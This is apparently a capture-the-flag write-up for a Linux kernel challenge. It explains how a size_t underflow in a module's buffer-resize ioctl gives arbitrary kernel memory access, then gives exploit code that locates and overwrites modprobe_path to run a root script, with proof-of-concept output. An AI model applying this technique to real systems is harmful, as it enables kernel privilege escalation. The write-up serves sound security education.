# solid_core (kernel, +smep, +smap, +kaslr, modprobe_path)

## Enumeration
I've started with checking the content of `solid_core.cpio` to retrieve module binary:

```console
$ ls
bzImage  run.sh  solid_core.cpio
$ mkdir extracted
$ cd extracted
$ cat ../solid_core.cpio | cpio -idvm
simp1e.ko
init
[...]
23550 blocks
```

To make reverse engineering easier I've also disabled dmesg restrictions and increased our privilages to root:

```bash
$ cat init
[...]
# echo 1 > /proc/sys/kernel/kptr_restrict
# echo 1 > /proc/sys/kernel/dmesg_restrict
[...]
#setsid /bin/cttyhack setuidgid 1000 /bin/sh
/bin/sh
[...]

$ find . -print0 | cpio --null -ov --format=newc >../solid_core.cpio
[...]
```

The RE part was the hardest one for me. You can find simplified (I havn't included mutexes and I've skiped many basic error checks) pseudocode can be found [here](csaw.c)

The basic idea is that a user can create channels:

```c
typedef struct channel_t
{
    int ref_count;
    unsigned int index;
    char *buf;
    size_t buf_size;
    size_t pos;
} channel_t;
```

with any buf_size. Moreover she/he can increase and decrease buf size, read and write to it. All checks for writing and reading are implemented correctly. For example in read:

```c
long read_buf(context_t *context, read_buf_arg_t *arg)
{
    read_buf_arg_t kernel_arg;
    channel_t *channel;

    copy_from_user(&kernel_arg, arg, 0x18);

    channel = context->act_channel;
    if (!channel)
        return -1;

    if (channel->pos + kernel_arg.count <= channel->buf_size) // check if user is not trying to read outside of a buffer
    {
        copy_to_user(kernel_arg.dst, &channel->buf[channel->pos], kernel_arg.count);
    }

    return 0;
}
```

### size_t overflow
I've found the vulnerability in function responsible for resizing the buffer. As I've mentioned before user can grow buffer of channel 5 by for example 777 bytes just by calling:

```c
#define CMD_INC_BUF_SIZE 0x77617366

typedef struct realloc_channel_arg_t
{
    int index;
    long count;
} realloc_channel_arg_t;

realloc_channel_arg_t realloc_channel_arg;
realloc_channel_arg.count = 777;
realloc_channel_arg.index = 5;
ioctl(fd, CMD_INC_BUF_SIZE, &realloc_channel_arg);
```

and shrink buffer of channel 5 by for example 666 bytes by calling:

```c
#define CMD_DEC_BUF_SIZE 0x77617366

typedef struct realloc_channel_arg_t
{
    int index;
    long count;
} realloc_channel_arg_t;

realloc_channel_arg_t realloc_channel_arg;
realloc_channel_arg.count = 666;
realloc_channel_arg.index = 5;
ioctl(fd, CMD_DEC_BUF_SIZE, &realloc_channel_arg);
```

Now, the function which handles resizing look like:

```c
int realloc_ipc_channel(int index, size_t count, int sign)
{
    channel_t *channel;
    size_t new_buf_size;
    char *new_buf;

    channel = get_channel_by_id(index);

    if (!sign)
        new_buf_size = channel->buf_size - count;
    else
        new_buf_size = channel->buf_size + count;

    new_buf = krealloc(channel->buf, new_buf_size + 1, GFP_KERNEL);
    if (!new_buf) {
        return -ENOMEM;
    }
    channel->buf = new_buf;
    channel->buf_size = new_buf_size;

    channel->ref_count -= 1;
    if (channel->ref_count == 0)
        ipc_channel_destroy(channel);

    return 0;
}
```

On the first glance it looked like everything is implemented correctly. Program even allocates one extra byte for null byte (as user can write string into buffer). It took me a while to find out that this is actually a critical vulnerability! Look what happens when:

- buf_size if equal to 1
- user want't to shrink the buffer by 2 bytes

Then new_buf_size will be equal to 0xffffffffffffffff, but krealloc will we called with new_buf_size + 1 = 0. And [man](https://manpages.debian.org/wheezy-backports/linux-manual-3.16/krealloc.9) page says that:

```
"If new_size is 0 and p is not a NULL pointer, the object pointed to is freed."
```

So krealloc will not fail as can check in [source](https://elixir.bootlin.com/linux/v5.5-rc1/source/mm/slab_common.c#L1713) code that krealloc will return ZERO_SIZE_PTR on free:

```c
#define ZERO_SIZE_PTR ((void *)16)

void *krealloc(const void *p, size_t new_size, gfp_t flags)
{
	void *ret;

	if (unlikely(!new_size)) {
		kfree(p);
		return ZERO_SIZE_PTR; // <--- here
	}

	ret = __do_krealloc(p, new_size, flags);
	if (ret && kasan_reset_tag(p) != kasan_reset_tag(ret))
		kfree(p);

	return ret;
}
```

and the crucial two assignements will be made.

```c
channel->buf = new_buf; // new_buf = 0x10
channel->buf_size = new_buf_size; // new_buf_size = 0xffffffffffffffff
```

So now we can read/write to any memory! (not entirely true as there is an extra limit in task that prevents us from writing only to lower kernel memory addresses): 

```c
#define HIGH_KERNEL_ADDRESS_BORDER ((uint64_t)0xffffffff80000000)

long write_buf(context_t *context, write_buf_arg_t *arg)
{
    write_buf_arg_t kernel_arg;
    channel_t *channel;

    copy_from_user(&kernel_arg, arg, 0x18);

    channel = context->act_channel;
    if (!channel)
        return -1;

    if (

    if (channel->pos + kernel_arg.count <= channel->buf_size) && (channel->buf + channel->pos) >= HIGH_KERNEL_ADDRESS_BORDER) // <--- additional check
    {
        strncpy_from_user(&channel->buf[channel->pos], kernel_arg.src, kernel_arg.count);
        return 0;
    }

    return -1;
}
```

## Exploit
Ok, so as I had arbitrary write, I've decided to perform modprobe_path overwrite attack. If you are not familiar with it, then let me very shortely explain how it works.

### Understanding modprobe
Linux extensively uses modules and so kernel needs a way to autoload them. For example if we try to run a program with unknown magic bytes like \xff\xff\xff\xff\xff\xff\xff\xff then a kernel will trigger modprobe so it can determinate how to run it. How does the kernel triggers modprobe? Well it just creates a /sbin/modprobe userland proccess with root privileges. The path to modprobe is binary (default /sbin/modprobe) is a global variable char[256].

### Overwriting modprobe
This means that we can just overwrite the modprobe_path with a path to our malicious escalate.sh binary which will just make flag file readable to everyone:

```console
$ cat /escalate.sh
#!/bin/sh

chmod 777 /flag
```

### Locating modprobe_path
As KASLR is enabled we need to first find the modprobe_path offset.
I've decided just to scan whole memory >0xffffffff80000000 looking for string "/sbin/modprobe":

```c
int find_modprobe_path_ofst() {
    /* Bypass KASLR and find modprobe ofst */
    char buf[PAGE_SIZE];
    char *modprobe_path_addr;
    size_t pos;

    for (int i = 0; i < SEARCH_LIMIT; ++i) {
        pos = HIGH_KERNEL_ADDRESS_BORDER + PAGE_SIZE * i;

        change_pos(g_fd, pos);
        read_buf(g_fd, PAGE_SIZE, buf);

        modprobe_path_addr = memmem(buf, PAGE_SIZE, "/sbin/modprobe", strlen("/sbin/modprobe"));
        if (!modprobe_path_addr) {
            continue;
        }

        change_pos(g_fd, pos + (modprobe_path_addr - buf));

        return 0;
    }

    return -1;
}
```

After finding modprobe_path address we can simply overwrite "/sbin/modprobe" with a path to our binary.

```c
int overwrite_modprobe_path(char* binary_name) {
    return write_buf(g_fd, strlen(binary_name) + 1, binary_name);
}
```

### Triggering modprobe
Then all we have to do is to create an file with unknown magic bytes and try to run it:

```c
void trigger_exploit() {
    /* Note: in the CTF challenge there is no /tmp folder. Therefore one must place trigger_modprobe somewhere else. */
    system("echo -ne \xff\xff\xff\xff > /tmp/trigger_modprobe");
    system("chmod u+x /tmp/trigger_modprobe");
    system("/tmp/trigger_modprobe");
}
```

and we are ready to test it out:


### PoC
```console
$ cat flag
cat: can't open 'flag': Permission denied

$ cat /escalage.sh
#!/bin/sh

chmod 777 /flag

$ ./exploit /escalate.sh 
[+] Succeeded to initialize
[+] Found modprobe_path offset
[+] Succeeded to overwrite modprobe_path
/tmp/trigger_modprobe: line 1: ����: not found

/ $ cat flag
flag{hijack_prctl_is_fun_and_function_pointer_is_dangerous}
```


[full exploit](exploit.c)

## Reference
- https://duasynt.com/blog/linux-kernel-module-autoloading
